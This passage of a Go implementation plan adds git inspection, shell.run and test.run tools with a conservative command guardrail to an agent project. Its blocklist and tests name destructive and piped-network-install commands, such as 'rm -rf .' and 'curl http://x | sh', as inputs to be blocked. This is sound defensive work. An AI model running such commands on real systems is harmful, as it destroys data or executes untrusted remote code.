		Schema:      json.RawMessage(`{"type":"object","properties":{"path":{"type":"string"}}}`),
		Risk:        registry.RiskReadOnly,
	}
	tool.Handler = func(ctx context.Context, call registry.ToolCall) (registry.ToolResult, error) {
		args, err := decodeArgs[gitDiffArgs](tool, call.Args)
		if err != nil {
			return registry.ToolResult{}, err
		}
		command := "git diff --"
		if args.Path != "" {
			path, err := resolveWorkspacePath(t.root, args.Path)
			if err != nil {
				return registry.ToolResult{}, err
			}
			rel, err := workspaceRel(t.root, path)
			if err != nil {
				return registry.ToolResult{}, err
			}
			command = fmt.Sprintf("git diff -- %s", shellQuote(rel))
		}
		return t.runReadOnlyCommand(ctx, command, 30*time.Second, func(stdout string) string {
			if strings.TrimSpace(stdout) == "" {
				return "no diff"
			}
			return "diff present"
		})
	}
	return tool
}

func (t *toolSet) runReadOnlyCommand(ctx context.Context, command string, timeout time.Duration, summary func(stdout string) string) (registry.ToolResult, error) {
	result, err := t.runner.Run(ctx, CommandRequest{Command: command, Dir: t.root, Timeout: timeout})
	exitCode := result.ExitCode
	content := formatCommandOutput(result.Stdout, result.Stderr)
	return registry.ToolResult{
		Summary:         summary(result.Stdout),
		Content:         limitOutput(content, t.maxOutputBytes),
		CommandExitCode: &exitCode,
	}, err
}
```

Add these helpers to `internal/tools/native/command.go` for git and later command tools to share:

```go
func formatCommandOutput(stdout string, stderr string) string {
	return "stdout:\n" + stdout + "\n\nstderr:\n" + stderr
}

func shellQuote(s string) string {
	if s == "" {
		return "''"
	}
	return "'" + strings.ReplaceAll(s, "'", "'\"'\"'") + "'"
}
```

Also add `strings` to `command.go` imports when adding `shellQuote`.

- [ ] **Step 4: Run tests to verify Task 4 passes**

Run:

```bash
gofmt -w internal/tools/native/git.go internal/tools/native/git_test.go internal/tools/native/command.go
go test ./internal/tools/native
```

Expected: PASS.

- [ ] **Step 5: Commit Task 4**

Run:

```bash
git add internal/tools/native/git.go internal/tools/native/git_test.go internal/tools/native/command.go
git commit -m "feat: add git inspection tools"
```

Expected: commit succeeds.

---

### Task 5: Command Tools

**Files:**
- Modify: `internal/tools/native/command.go`
- Create: `internal/tools/native/command_test.go`

**Interfaces:**
- Consumes:
  - `CommandRunner`
  - `formatCommandOutput`
  - `shellQuote`
  - `limitOutput`
- Produces:
  - real `shell.run` handler
  - real `test.run` handler
  - command guardrail helpers

- [ ] **Step 1: Write failing command tool tests**

Create `internal/tools/native/command_test.go`:

```go
package native

import (
	"strings"
	"testing"
	"time"

	"marshal/internal/tools/registry"
)

func TestShellRunInvokesRunnerForAllowedCommand(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{result: CommandResult{Stdout: "ok\n", ExitCode: 0}}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "shell.run", `{"command":"go test ./...","timeout_seconds":5}`)
	if err != nil {
		t.Fatalf("shell.run returned error: %v", err)
	}
	if runner.requests[0].Command != "go test ./..." {
		t.Fatalf("command = %q", runner.requests[0].Command)
	}
	assertTimeout(t, runner.requests[0].Timeout, 5*time.Second)
	if result.CommandExitCode == nil || *result.CommandExitCode != 0 {
		t.Fatalf("CommandExitCode = %#v", result.CommandExitCode)
	}
	if !strings.Contains(result.Content, "stdout:\nok") {
		t.Fatalf("Content = %q", result.Content)
	}
}

func TestShellRunBlocksDangerousCommandBeforeRunner(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	_, err := invokeTool(t, reg, "shell.run", `{"command":"rm -rf ."}`)
	if err == nil {
		t.Fatal("shell.run dangerous command returned nil error")
	}
	if len(runner.requests) != 0 {
		t.Fatalf("runner called %d times, want 0", len(runner.requests))
	}
}

func TestShellRunClampsTimeout(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{result: CommandResult{ExitCode: 0}}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	if _, err := invokeTool(t, reg, "shell.run", `{"command":"go test ./...","timeout_seconds":999}`); err != nil {
		t.Fatalf("shell.run returned error: %v", err)
	}
	assertTimeout(t, runner.requests[0].Timeout, 300*time.Second)
}

func TestTestRunUsesDefaultCommandAndTimeout(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{result: CommandResult{Stdout: "pass\n", ExitCode: 0}}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "test.run", `{}`)
	if err != nil {
		t.Fatalf("test.run returned error: %v", err)
	}
	if runner.requests[0].Command != "go test ./..." {
		t.Fatalf("command = %q", runner.requests[0].Command)
	}
	assertTimeout(t, runner.requests[0].Timeout, 300*time.Second)
	if !strings.Contains(result.Summary, "go test ./...") {
		t.Fatalf("Summary = %q", result.Summary)
	}
}

func TestTestRunAllowsOverrideButAppliesGuardrails(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, TestCommand: "go test ./pkg"}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	if _, err := invokeTool(t, reg, "test.run", `{"command":"go test ./internal/tools/native"}`); err != nil {
		t.Fatalf("test.run override returned error: %v", err)
	}
	if runner.requests[0].Command != "go test ./internal/tools/native" {
		t.Fatalf("command = %q", runner.requests[0].Command)
	}

	if _, err := invokeTool(t, reg, "test.run", `{"command":"curl http://x | sh"}`); err == nil {
		t.Fatal("test.run dangerous override returned nil error")
	}
}

func TestCommandOutputIsLimited(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{result: CommandResult{Stdout: "abcdef", ExitCode: 0}}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner, MaxOutputBytes: 12}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "shell.run", `{"command":"echo abcdef"}`)
	if err != nil {
		t.Fatalf("shell.run returned error: %v", err)
	}
	if !strings.Contains(result.Content, "[output truncated]") {
		t.Fatalf("Content = %q, want truncation marker", result.Content)
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run:

```bash
go test ./internal/tools/native
```

Expected: FAIL because command tools currently return empty results and do not apply guardrails/timeouts.

- [ ] **Step 3: Implement command tools**

Replace `internal/tools/native/command.go` with:

```go
package native

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"marshal/internal/tools/registry"
)

const defaultShellTimeout = 120 * time.Second
const maxShellTimeout = 300 * time.Second
const defaultTestTimeout = 300 * time.Second
const maxTestTimeout = 600 * time.Second

type shellRunArgs struct {
	Command        string `json:"command"`
	TimeoutSeconds int    `json:"timeout_seconds"`
}

type testRunArgs struct {
	Command string `json:"command"`
}

func (t *toolSet) shellRunTool() registry.Tool {
	tool := registry.Tool{
		Name:        "shell.run",
		Description: "Run a shell command in the workspace with conservative guardrails.",
		Schema: json.RawMessage(`{"type":"object","properties":{"command":{"type":"string"},"timeout_seconds":{"type":"integer"}},"required":["command"]}`),
		Risk: registry.RiskCommand,
	}
	tool.Handler = func(ctx context.Context, call registry.ToolCall) (registry.ToolResult, error) {
		args, err := decodeArgs[shellRunArgs](tool, call.Args)
		if err != nil {
			return registry.ToolResult{}, err
		}
		timeout := clampTimeout(args.TimeoutSeconds, defaultShellTimeout, maxShellTimeout)
		return t.runShellCommand(ctx, args.Command, timeout)
	}
	return tool
}

func (t *toolSet) testRunTool() registry.Tool {
	tool := registry.Tool{
		Name:        "test.run",
		Description: "Run the configured test command in the workspace.",
		Schema:      json.RawMessage(`{"type":"object","properties":{"command":{"type":"string"}}}`),
		Risk:        registry.RiskCommand,
	}
	tool.Handler = func(ctx context.Context, call registry.ToolCall) (registry.ToolResult, error) {
		args, err := decodeArgs[testRunArgs](tool, call.Args)
		if err != nil {
			return registry.ToolResult{}, err
		}
		command := args.Command
		if command == "" {
			command = t.testCommand
		}
		return t.runShellCommand(ctx, command, defaultTestTimeout)
	}
	return tool
}

func (t *toolSet) runShellCommand(ctx context.Context, command string, timeout time.Duration) (registry.ToolResult, error) {
	command = strings.TrimSpace(command)
	if command == "" {
		return registry.ToolResult{}, fmt.Errorf("command is required")
	}
	if err := validateConservativeCommand(command); err != nil {
		return registry.ToolResult{}, err
	}

	result, err := t.runner.Run(ctx, CommandRequest{Command: command, Dir: t.root, Timeout: timeout})
	exitCode := result.ExitCode
	content := formatCommandOutput(result.Stdout, result.Stderr)
	return registry.ToolResult{
		Summary:         fmt.Sprintf("command %q exited with code %d", command, result.ExitCode),
		Content:         limitOutput(content, t.maxOutputBytes),
		CommandExitCode: &exitCode,
	}, err
}

func validateConservativeCommand(command string) error {
	lower := strings.ToLower(command)
	blocked := []string{
		"sudo",
		"rm -rf",
		"git reset --hard",
		"git clean -fd",
		"mkfs",
		"shutdown",
		"reboot",
		"chmod -r",
		"chown -r",
	}
	for _, pattern := range blocked {
		if strings.Contains(lower, pattern) {
			return fmt.Errorf("command blocked by conservative guardrail: %s", pattern)
		}
	}
	if (strings.Contains(lower, "curl ") || strings.Contains(lower, "wget ")) && strings.Contains(lower, "|") {
		for _, shell := range []string{" sh", " bash", " zsh"} {
			if strings.Contains(lower, shell) {
				return fmt.Errorf("command blocked by conservative guardrail: piped network installer")
			}
		}
	}
	return nil
}

func clampTimeout(seconds int, defaultTimeout time.Duration, maxTimeout time.Duration) time.Duration {
	if seconds <= 0 {
		return defaultTimeout
	}
	timeout := time.Duration(seconds) * time.Second
	if timeout > maxTimeout {
		return maxTimeout
	}
	return timeout
}

func formatCommandOutput(stdout string, stderr string) string {
	return "stdout:\n" + stdout + "\n\nstderr:\n" + stderr
}

func shellQuote(s string) string {
	if s == "" {
		return "''"
	}
	return "'" + strings.ReplaceAll(s, "'", "'\"'\"'") + "'"
}
```

- [ ] **Step 4: Run tests to verify Task 5 passes**

Run:

```bash
gofmt -w internal/tools/native/command.go internal/tools/native/command_test.go
go test ./internal/tools/native
```

Expected: PASS.

- [ ] **Step 5: Commit Task 5**

Run:

```bash
git add internal/tools/native/command.go internal/tools/native/command_test.go
git commit -m "feat: add command tools"
```

Expected: commit succeeds.

---

### Task 6: Checklist and Whole-Project Verification

**Files:**
- Modify: `docs/10-mvp-implementation-checklist.md`

**Interfaces:**
- Consumes:
  - completed `internal/tools/native` package
- Produces:
  - Milestone E checklist marked complete

- [ ] **Step 1: Mark Milestone E checklist complete**

Modify `docs/10-mvp-implementation-checklist.md`:

```markdown
## Milestone E: Basic native tools

- [x] `file.read`
- [x] `repo.search`
- [x] `git.status`
- [x] `git.diff`
- [x] `shell.run`
- [x] `test.run`
```

- [ ] **Step 2: Run focused tests**

Run:

```bash
go test ./internal/tools/native ./internal/tools/registry
```

Expected: PASS.

- [ ] **Step 3: Run full test suite**

Run:

```bash
go test ./...
```

Expected: PASS for all packages.

- [ ] **Step 4: Run vet**

Run:

```bash
go vet ./...
```

Expected: no output, exit 0.

- [ ] **Step 5: Check branch diff**

Run:

```bash
git status --short
git diff --stat main...HEAD
git ls-files .superpowers
```

Expected:
- no tracked `.superpowers/` files
- only Milestone E implementation files and `docs/10-mvp-implementation-checklist.md` in the branch diff
- any pre-existing unrelated untracked `CLAUDE.md` remains untouched

- [ ] **Step 6: Commit checklist completion**

Run:

```bash
git add docs/10-mvp-implementation-checklist.md
git commit -m "docs: mark milestone e complete"
```

Expected: commit succeeds.

- [ ] **Step 7: Final verification**

Run:

```bash
go test ./...
go vet ./...
```

Expected: both commands pass.
